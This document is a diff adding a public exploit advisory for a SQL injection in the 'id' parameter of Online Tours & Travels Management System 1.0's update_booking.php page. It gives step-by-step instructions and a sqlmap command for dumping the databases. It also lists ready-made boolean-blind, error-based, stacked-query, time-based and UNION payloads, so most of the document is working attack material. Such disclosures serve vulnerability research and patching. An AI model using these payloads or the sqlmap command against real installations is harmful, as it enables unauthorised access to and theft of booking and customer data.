@@ -1,0 +1,74 @@
+# Exploit Title: Online Tours & Travels Management System 1.0 - "id" SQL Injection
+# Exploit Author: Saeed Bala Ahmed (r0b0tG4nG)
+# Date: 2020-12-11
+# Google Dork: N/A
+# Vendor Homepage: https://www.sourcecodester.com/php/14510/online-tours-travels-management-system-project-using-php-and-mysql.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14510&title=Online+Tours+%26+Travels+management+system+project+using+PHP+and+MySQL
+# Affected Version: Version 1
+# Patched Version: Unpatched
+# Category: Web Application
+# Tested on: Parrot OS
+
+Step 1. Login to the application with admin credentials
+
+Step 2. Click on "Bookings" in header and select "Add Bookings".
+
+Step 3. Complete the required details and click on "Save" to save the new Bookings.
+
+Step 4. On the "Bookings" page, find your new booking/existing booking and click on the edit icon.
+
+Step 5. You will be redirected to a page like "http://localhost/admin/update_booking.php?id=1". Or visit any page that has the "id" parameter. Capture the current page request in burpsuite.
+
+Step 6. Save request and run sqlmap on request file using command " sqlmap -r request -p id --time-sec=5 --dbs ".
+
+Step 7. This will inject successfully and you will have an information disclosure of all databases contents.
+
+---
+
+Parameter: id (GET)
+
+    Type: boolean-based blind
+
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+
+    Payload: id=2' RLIKE (SELECT (CASE WHEN (4085=4085) THEN 2 ELSE 0x28 END))-- rKrg
+
+
+
+    Type: error-based
+
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+
+   
+ Payload: id=2' AND (SELECT 7113 FROM(SELECT 
+COUNT(*),CONCAT(0x716a626a71,(SELECT 
+(ELT(7113=7113,1))),0x71766b6a71,FLOOR(RAND(0)*2))x FROM 
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- tGzP
+
+
+
+    Type: stacked queries
+
+    Title: MySQL >= 5.0.12 stacked queries (comment)
+
+    Payload: id=2';SELECT SLEEP(5)#
+
+
+
+    Type: time-based blind
+
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+
+    Payload: id=2' AND (SELECT 8504 FROM (SELECT(SLEEP(5)))sMoK)-- IXQq
+
+
+
+    Type: UNION query
+
+    Title: MySQL UNION query (NULL) - 4 columns
+
+   
+ Payload: id=-1072' UNION ALL SELECT 
+NULL,CONCAT(0x716a626a71,0x664b4d6f72794f69657a6c5a4e415a434b70547951435077694b66505a7572574d73704b54524b72,0x71766b6a71),NULL,NULL#
+
+---
